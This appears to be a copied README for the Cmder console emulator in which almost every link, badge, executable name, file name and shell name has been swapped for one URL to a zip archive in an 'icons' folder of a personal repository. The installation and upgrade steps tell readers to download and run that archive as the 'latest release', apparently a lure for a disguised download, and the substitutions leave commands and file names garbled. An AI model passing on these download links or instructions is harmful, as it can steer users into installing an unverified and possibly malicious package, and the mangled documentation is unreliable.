# Cmder

[![Join the chat at https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip](https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip%https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip)](https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip) [![Build Status](https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip)](https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip) [![Build Status](https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip)](https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip)

Cmder is a **software package** created out of pure frustration over absence of usable console emulator on Windows. It is based on [ConEmu](https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip) with *major* config overhaul, comes with a Monokai color scheme, amazing [clink](https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip) (further enhanced by [clink-completions](https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip)) and a custom prompt layout.

![Cmder Screenshot](https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip)

## Why use it

The main advantage of Cmder is portability. It is designed to be totally self-contained with no external dependencies, which makes it great for **USB Sticks** or **cloud storage**. So you can carry your console, aliases and binaries (like `wget`, `curl` and `git`) with you anywhere.

The Cmder's user interface is also designed to be more eye pleasing, and you can compare the main differences between Cmder and ConEmu [here](https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip).

## Installation
### Single User Portable Config

1. Download the [latest release](https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip)
2. Extract the archive. *Note: This path should not be `C:\Program Files` or anywhere else that would require Administrator access for modifying configuration files*
3. (optional) Place your own executable files into the `%cmder_root%\bin` folder to be injected into your PATH.
4. Run `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`

### Shared Cmder install with Non-Portable Individual User Config
1. Download the [latest release](https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip)
2. Extract the archive to a shared location.
3. (optional) Place your own executable files and custom app folders into the `%cmder_root%\bin`. See: [https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip](https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip)
   - This folder to be injected into your PATH by default.
   - See `/max_depth [1-5]` in 'Command Line Arguments for `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`' table to add subdirectories recursively.
4. (optional) Place your own custom app folders into the `%cmder_root%\opt`. See: [https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip](https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip)
   - This folder will NOT be injected into your PATH so you have total control of what gets added.
5. Run `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` with `/C` command line argument. Example: `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip /C %userprofile%\cmder_config`
   * This will create the following directory structure if it is missing.

     ```
     c:\users\[username]\cmder_config
     ├───bin
     ├───config
     │   └───profile.d
     └───opt
     ```

  - (optional) Place your own executable files and custom app folders into `%userprofile%\cmder_config\bin`.
    - This folder to be injected into your PATH by default.
    - See `/max_depth [1-5]` in 'Command Line Arguments for `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`' table to add subdirectories recursively.
  - (optional) Place your own custom app folders into the `%user_profile%\cmder_config\opt`.
    - This folder will NOT be injected into your PATH so you have total control of what gets added.


* Both the shared install and the individual user config locations can contain a full set of init and profile.d scripts enabling shared config with user overrides.  See below.

## https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip Command Line Arguments


| Argument                  | Description                                                                              |
| ------------------------- | -----------------------------------------------------------------------                  |
| `/C [user_root_path]`     | Individual user Cmder root folder.  Example: `%userprofile%\cmder_config`                |
| `/M`                      | Use `conemu-%computername%.xml` for ConEmu settings storage instead of `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` |
| `/REGISTER [ALL, USER]`   | Register a Windows Shell Menu shortcut.                                                  |
| `/UNREGISTER [ALL, USER]` | Un-register a Windows Shell Menu shortcut.                                               |
| `/SINGLE`                 | Start Cmder in single mode.                                                              |
| `/START [start_path]`     | Folder path to start in.                                                                 |
| `/TASK [task_name]`       | Task to start after launch.                                                              |
| `/X [ConEmu extras pars]` | Forwards parameters to ConEmu                                                            |

## Context Menu Integration

So you've experimented with Cmder a little and want to give it a shot in a more permanent home;

### Shortcut to open Cmder in a chosen folder

1. Open a terminal as an Administrator
2. Navigate to the directory you have placed Cmder
3. Execute `.\https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip /REGISTER ALL`
   _If you get an "Access Denied" message, make sure you are executing the command in an **Administrator** prompt._

In a file explorer window right click in or on a directory to see "Cmder Here" in the context menu.

## Keyboard shortcuts

### Tab manipulation

* <kbd>Ctrl</kbd> + <kbd>T</kbd> : New tab dialog (maybe you want to open cmd as admin?)
* <kbd>Ctrl</kbd> + <kbd>W</kbd> : Close tab
* <kbd>Ctrl</kbd> + <kbd>D</kbd> : Close tab (if pressed on empty command)
* <kbd>Shift</kbd> + <kbd>Alt</kbd> + <kbd>#Number</kbd> : Fast new tab: <kbd>1</kbd> - CMD, <kbd>2</kbd> - PowerShell
* <kbd>Ctrl</kbd> + <kbd>Tab</kbd> : Switch to next tab
* <kbd>Ctrl</kbd> + <kbd>Shift</kbd> + <kbd>Tab</kbd> : Switch to previous tab
* <kbd>Ctrl</kbd> + <kbd>#Number</kbd> : Switch to tab #Number
* <kbd>Alt</kbd> + <kbd>Enter</kbd>: Fullscreen

### Shell

* <kbd>Ctrl</kbd> + <kbd>Alt</kbd> + <kbd>U</kbd> : Traverse up in directory structure (lovely feature!)
* <kbd>End</kbd>, <kbd>Home</kbd>, <kbd>Ctrl</kbd> : Traversing text with as usual on Windows
* <kbd>Ctrl</kbd> + <kbd>R</kbd> : History search
* <kbd>Shift</kbd> + Mouse : Select and copy text from buffer

_(Some shortcuts are not yet documented, though they exist - please document them here)_

## Features

### Access to multiple shells in one window using tabs
You can open multiple tabs each containing one of the following shells:

| Task                | Shell            | Description                                                                                                  |
| ----                | -----            | -----------                                                                                                  |
| Cmder               | `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`        | Windows `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` shell enhanced with Git, Git aware prompt, Clink (GNU Readline), and Aliases.              |
| Cmder as Admin      | `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`        | Administrative Windows `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` Cmder shell.                                                                |
| PowerShell          | `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` | Windows PowerShell enhanced with Git and Git aware prompt .                                                  |
| PowerShell as Admin | `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` | Administrative Windows `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` Cmder shell.                                                         |
| Bash                | `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`       | Unix/Linux like bash shell running on Windows.                                                               |
| Bash as Admin       | `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`       | Administrative Unix/Linux like bash shell running on Windows.                                                |
| Mintty              | `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`       | Unix/Linux like bash shell running on Windows. See below for Mintty configuration differences                |
| Mintty as Admin     | `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`       | Administrative Unix/Linux like bash shell running on Windows. See below for Mintty configuration differences |

Cmder, PowerShell, and Bash tabs all run on top of the Windows Console API and work as you might expect in Cmder with access to use ConEmu's color schemes, key bindings and other settings defined in the ConEmu Settings dialog.

⚠ *Note:* Only the full edition of Cmder comes with a pre-installed bash, using a vendored [git-for-windows](https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip) installation. The pre-configured Bash tabs may not work on Cmder mini edition without additional configuration.

You may however, choose to use an external installation of bash, such as Microsoft's [Subsystem for Linux](https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip) (called WSL) or the [Cygwin](https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip) project which provides POSIX support on windows.

⚠ *Note:* Mintty tabs use a program called 'mintty' as the terminal emulator that is not based on the Windows Console API, rather it's rendered graphically by ConEmu. Mintty differs from the other tabs in that it supports xterm/xterm-256color TERM types, and does not work with ConEmu settings like color schemes and key bindings.  As such, some differences in functionality are to be expected, such as Cmder not being able to apply a system-wide configuration to it.

As a result mintty specific config is done via the `[%USERPROFILE%|$HOME]https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` file.  You may read more about Mintty and its config file [here](https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip).

An example of setting Cmder portable terminal colors for mintty:

From a bash/mintty shell:

```
cd $CMDER_ROOT/vendor
git clone https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip
cd mintty-colors-solarized/
echo source \$https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip>>$https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip
```

You may find some Monokai color schemes for mintty to match Cmder [here](https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip).

### Changing Cmder Default `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` Prompt Config File

The default Cmder shell `cmd::Cmder` prompt is customized using `Clink` and is configured by editing a config file that exists in one of two locations:

- Single User Portable Config `%CMDER_ROOT%\config\https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`
- Shared Cmder install with Non-Portable Individual User Config `%CMDER_USER_CONFIG%\https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`

If your Cmder setup does not have this file create it from `%CMDER_ROOT%\vendor\https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`

Customizations include:

- Colors.
- Single/Multi-line.
- Full path/Folder only.
- `[user]@[host]` to the beginning of the prompt.
- `~` for home directory.
- `λ` symbol

Documentation is in the file for each setting.

### Changing Cmder Default `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` Shell Startup Behaviour Using Task Arguments

1. Press <kbd>Win</kbd> + <kbd>Alt</kbd> + <kbd>T</kbd>
1. Click either:
  * `1. {cmd::Cmder as Admin}`
  * `2. {cmd::Cmder}`
1. Add command line arguments where specified below:

  *Note: Pay attention to the quotes!*

  ```
  cmd /s /k ""%ConEmuDir%\..\https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip" [ADD ARGS HERE]"
  ```

##### Command Line Arguments for `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`

| Argument                        | Description                                                                                                                                        | Default                                |
| -----------------------------   | ----------------------------------------------------------------------------------------------                                                     | -------------------------------------  |
| `/c [user cmder root]`          | Enables user bin and config folders for 'Cmder as admin' sessions due to non-shared environment.                                                   | not set                                |
| `/d`                            | Enables debug output.                                                                                                                              | not set                                |
| `/f`                            | Enables Cmder Fast Init Mode. This disables some features, see pull request [#1492](https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip) for more details. | not set                                |
| `/t`                            | Enables Cmder Timed Init Mode. This displays the time taken run init scripts                                                                       | not set                                |
| `/git_install_root [file path]` | User specified Git installation root path.                                                                                                         | `%CMDER_ROOT%\vendor\Git-for-Windows`  |
| `/home [home folder]`           | User specified folder path to set `%HOME%` environment variable.                                                                                   | `%userprofile%`                        |
| `/max_depth [1-5]`              | Define max recurse depth when adding to the path for `%cmder_root%\bin` and `%cmder_user_bin%`                                                     | 1                                      |
| `/nix_tools [0-2]`              | Define how `*nix` tools are added to the path.  Prefer Windows Tools: 1, Prefer *nix Tools: 2, No `/usr/bin` in `%PATH%`: 0                        | 1                                      |
| `/svn_ssh [path to https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip]`    | Define `%SVN_SSH%` so we can use git svn with ssh svn repositories.                                                                                | `%GIT_INSTALL_ROOT%\bin\https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`       |
| `/user_aliases [file path]`     | File path pointing to user aliases.                                                                                                                | `%CMDER_ROOT%\config\https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` |
| `/v`                            | Enables verbose output.                                                                                                                            | not set                                |
| (custom arguments)              | User defined arguments processed by `cexec`. Type `cexec /?` for more usage.                                                                      | not set                                |

### Cmder Shell User Config
Single user portable configuration is possible using the Cmder specific shell config files.  Edit the below files to add your own configuration:

| Shell         | Cmder Portable User Config                |
| ------------- | ----------------------------------------- |
| Cmder         | `%CMDER_ROOT%\config\https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`    |
| PowerShell    | `$ENV:CMDER_ROOT\config\https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` |
| Bash/Mintty   | `$https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`      |

**Note:** Bash and Mintty sessions will also source the `$https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` file if it exists after it sources `$https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`.

You can write `*.cmd|*.bat`, `*.ps1`, and `*.sh` scripts and just drop them in the `%CMDER_ROOT%\config\profile.d` folder to add startup config to Cmder.

| Shell         | Cmder `Profile.d` Scripts                          |
| ------------- | -------------------------------------------------- |
| Cmder         | `%CMDER_ROOT%\config\profile.d\*.bat and *.cmd`    |
| PowerShell    | `$ENV:CMDER_ROOT\config\profile.d\*.ps1`           |
| Bash/Mintty   | `$CMDER_ROOT/config/profile.d/*.sh`                |

#### Git Status Opt-Out

 To disable Cmder prompt git status globally add the following to `~https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` or locally for a single repo `[repo]https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` and start a new session.

 *Note: This configuration is not portable*

 ```
 [cmder]
   status = false      # Opt out of Git status for 'ALL' Cmder supported shells.
   cmdstatus = false   # Opt out of Git status for 'https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip' shells.
   psstatus = false    # Opt out of Git status for 'https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip and 'https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip' shells.
   shstatus = false    # Opt out of Git status for 'https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip' shells.
 ```

### Aliases
#### Cmder(`https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`) Aliases
You can define simple aliases for `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` sessions with a command like `alias name=command`.  https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip aliases support optional parameters through the `$1-9` or the `$*` special characters so the alias `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip $*` typed as `vi [filename]` will open `[filename]` in `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`.

https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip aliases can also be more complex. See: [https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip documentation](https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip) for additional details on complex aliases/macros for `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`

Aliases defined using the `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` command will automatically be saved in the `%CMDER_ROOT%\config\https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` file

To make an alias and/or any other profile settings permanent add it to one of the following:

Note: These are loaded in this order by `$https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`.  Anything stored in `%CMDER_ROOT%` will be a portable setting and will follow Cmder to another machine.

* `%CMDER_ROOT%\config\profile.d\*.cmd` and `\*.bat`
* `%CMDER_ROOT%\config\https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`
* `%CMDER_ROOT%\config\https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`

#### https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip|https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip Aliases
Bash shells support simple and complex aliases with optional parameters natively so they work a little different.  Typing `alias name=command` will create an alias only for the current running session.

To make an alias and/or any other profile settings permanent add it to one of the following:

Note: These are loaded in this order by `$https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`.  Anything stored in `$CMDER_ROOT` will be a portable setting and will follow Cmder to another machine.

* `$CMDER_ROOT/config/profile.d/*.sh`
* `$https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`
* `$https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`

If you add bash aliases to `$https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` they will be portable and follow your Cmder folder if you copy it to another machine.  `$https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` defined aliases are not portable.

#### https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip Aliases
PowerShell has native simple alias support, for example `[new-alias | set-alias] alias command`, so complex aliases with optional parameters are not supported in PowerShell sessions.  Type `get-help [new-alias|set-alias] -full` for help on PowerShell aliases.

To make an alias and/or any other profile settings permanent add it to one of the following:

Note: These are loaded in this order by `$ENV:CMDER_ROOT\vendor\https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`.  Anything stored in `$ENV:CMDER_ROOT` will be a portable setting and will follow Cmder to another machine.

* `$ENV:CMDER_ROOT\config\profile.d\*.ps1`
* `$ENV:CMDER_ROOT\config\https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`

### SSH Agent

To start the vendored SSH agent simply call `start-ssh-agent`, which is in the `vendor/git-for-windows/cmd` folder.

If you want to run SSH agent on startup, include the line `@call "%GIT_INSTALL_ROOT%https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip"` in `%CMDER_ROOT%https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` (usually just uncomment it).

### Vendored Git

Cmder is by default shipped with a vendored Git installation.  On each instance of launching Cmder, an attempt is made to locate any other user provided Git binaries. Upon finding a `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` binary, Cmder further compares its version against the vendored one _by executing_ it. The vendored `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` binary is _only_ used when it is more recent than the user-installed one.

You may use your favorite version of Git by including its path in the `%PATH%` environment variable.  Moreover, the **Mini** edition of Cmder (found on the [downloads page](https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip)) excludes any vendored Git binaries.

### Using external Cygwin/Babun, MSys2, WSL, or Git for Windows SDK with Cmder.

You may run bash (the default shell used on Linux, macOS and GNU/Hurd) externally on Cmder, using the following instructions:

1. Setup a new task by pressing <kbd>Win</kbd> +<kbd>Alt</kbd> + <kbd>T</kbd>.
1. Click the `+` button to add a task.
1. Name the new task in the top text box.
1. Provide task parameters, this is optional.
1. Add `cmd /c "[path_to_external_env]\bin\bash --login -i" -new_console` to the `Commands` text box.

**Recommended Optional Steps:**

Copy the `vendor/cmder_exinit` file to the Cygwin/Babun, MSys2, or Git for Windows SDK environments `/etc/profile.d/` folder to use portable settings in the `$CMDER_ROOT/config` folder.

Note: MinGW could work if the init scripts include `profile.d` but this has not been tested.

The destination file extension depends on the shell you use in that environment.  For example:

* bash - Copy to `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`
* zsh  - Copy to `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`

Uncomment and edit the line below in the script to use Cmder config even when launched from outside Cmder.

```
# CMDER_ROOT=${USERPROFILE}/cmder  # This is not required if launched from Cmder.
```

### Customizing user sessions using `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` custom arguments.

You can pass custom arguments to `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` and use `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` in your `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` to evaluate these
arguments then execute commands based on a particular flag being detected or not.

`https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` creates two shortcuts for using `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` in your profile scripts.

#### `%ccall%` - Evaluates flags, runs commands if found,  and returns to the calling script and continues.

```
ccall=call C:\Users\user\cmderdev\vendor\bin\https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip
```

Example: `%ccall% /startnotepad start https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`

#### `%cexec%` - Evaluates flags, runs commands if found, and does not return to the calling script.

```
cexec=C:\Users\user\cmderdev\vendor\bin\https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip
```

Example: `%cexec% /startnotepad start https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`

It is useful when you have multiple tasks to execute `cmder` and need it to initialize
the session differently depending on the task chosen.

To conditionally start `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` when you start a specific `cmder` task:

* Press <kbd>win</kbd>+<kbd>alt</kbd>+<kbd>t</kbd>
* Click `+` to add a new task.
* Add the below to the `Commands` block:

  ```batch

  https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip /k ""%ConEmuDir%\..\https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip" /startnotepad"

  ```

* Add the below to your `%cmder_root%\config\https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`

  ```batch

  %ccall% "/startNotepad" "start" "https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip"`

  ```

To see detailed usage of `cexec`, type `cexec /?` in Cmder.

### Integrating Cmder with [Windows Terminal](https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip), [VS Code](https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip), and your favorite IDEs

Cmder by default comes with a vendored ConEmu installation as the underlying terminal emulator, as stated [here](https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip).

However, Cmder can in fact run in a variety of other terminal emulators, and even integrated IDEs. Assuming you have the latest version of Cmder, follow the following instructions to get Cmder working with your own terminal emulator.

For instructions on how to integrate Cmder with your IDE, please read our [Wiki section](https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip).

## Upgrading

The process of upgrading Cmder depends on the version/build you are currently running.

If you have a `[cmder_root]/config/user[-|_]https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`, you are running a newer version of Cmder, follow the below process:

1. Exit all Cmder sessions and relaunch `[cmder_root]https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`, this backs up your existing `[cmder_root]https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` to `[cmder_root]/config/user[-|_]https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`.

   * The `[cmder_root]/config/user[-|_]https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` contains any custom settings you have made using the 'Setup Tasks' settings dialog.

2. Exit all Cmder sessions and backup any files you have manually edited under `[cmder_root]/vendor`.

   * Editing files under `[cmder_root]/vendor` is not recommended since you will need to re-apply these changes after any upgrade.  All user customizations should go in `[cmder_root]/config` folder.

3.  Delete the `[cmder_root]/vendor` folder.
4.  Extract the new `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` or `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` into `[cmder_root]/` overwriting all files when prompted.

If you do not have a `[cmder_root]/config/user[-|_]https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`, you are running an older version of cmder, follow the below process:

1. Exit all Cmder sessions and backup `[cmder_root]https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` to `[cmder_root]/config/user[-|_]https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip`.

2. Backup any files you have manually edited under `[cmder_root]/vendor`.

   * Editing files under `[cmder_root]/vendor` is not recommended since you will need to re-apply these changes after any upgrade.  All user customizations should go in `[cmder_root]/config` folder.

3.  Delete the `[cmder_root]/vendor` folder.
4.  Extract the new `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` or `https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip` into `[cmder_root]/` overwriting all files when prompted.

## Current development builds

You can download builds of the current development branch by going to AppVeyor via the following link:

[![AppVeyor](https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip)](https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip)

The latest download builds by GitHub Actions can be downloaded from the link below:

[![Build Status](https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip)](https://raw.githubusercontent.com/candrapersada/cmder/master/icons/cmder-3.3.zip)

## License

All software included is bundled with own license

The MIT License (MIT)

Copyright (c) 2016 Samuel Vasko

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
